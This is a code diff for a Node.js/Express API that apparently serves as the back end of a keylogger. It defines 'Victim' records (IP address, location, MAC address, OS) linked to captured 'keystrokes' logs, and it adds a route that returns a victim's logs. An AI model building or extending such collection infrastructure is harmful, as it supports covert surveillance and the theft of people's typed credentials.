@@ -14,19 +14,30 @@ const sequelize = new Sequelize(config.db.database, config.db.username, config.d
 
 const Victim = sequelize.import(path.join(__dirname, '../models/victim'));
 const Log = sequelize.import(path.join(__dirname, '../models/log'));
-Log.belongsTo(Victim);
+Victim.hasMany(Log, {
+  foreignKey: {
+    allowNull: true
+  }
+});
 
-sequelize.sync();
+sequelize.sync({
+  force: true
+}).then(()=> {
+  // TODO: remove test-case
+  victim = Victim.create({
+    ip: '39.136.14.94',
+    country: 'Austria',
+    region: 'Vienna',
+    city: 'Vienna',
+    macAdress: 'aa-aa-aa-aa-aa-aa',
+    os: 'linux',
+  })
 
-// TODO: remove test-case
-Victim.create({
-  ip: '39.136.14.94',
-  country: 'Austria',
-  region: 'Vienna',
-  city: 'Vienna',
-  macAdress: 'aa-aa-aa-aa-aa-aa',
-  os: 'linux'
+  log = Log.create({
+    keystrokes: "asdf"
+  })
 })
+
 
 /**
  * @apiDefine Auth Authentication is needed for this API
@@ -40,8 +51,6 @@ Victim.create({
 router.use('/victims', (req, res, next) => {
     // grab api key from various request methods
     var apikey = req.header('X-API-KEY') || req.query.apikey || req.body.apikey;
-
-    console.log(apikey)
 
     if(config.api.keys.indexOf(apikey) >= 0){
       next();
@@ -84,6 +93,28 @@ router.get('/victims/:id', (req, res, next) => {
       res.json({error: "not found"});
     else
       res.json(victim);
+  });
+});
+
+/**
+ * @api {get} /api/victims/:id Request attributes from specific victim
+ * @apiName GetVictim
+ * @apiGroup Victims
+ * 
+ * @apiUse Auth
+ * @apiPermission Admin
+ * 
+ * @apiParam {Number} id Victims unique id
+ * @apiSuccess {Victim} victim single victim which is already tracked
+ */
+router.get('/victims/:id/logs', (req, res, next) => {
+  Victim.findById(req.params.id).then(victim => {
+    if(victim == null)
+      res.json({error: "not found"});
+    else
+      victim.getLogs().then(associatedLogs =>{
+        res.json(associatedLogs);
+      });
   });
 });
 
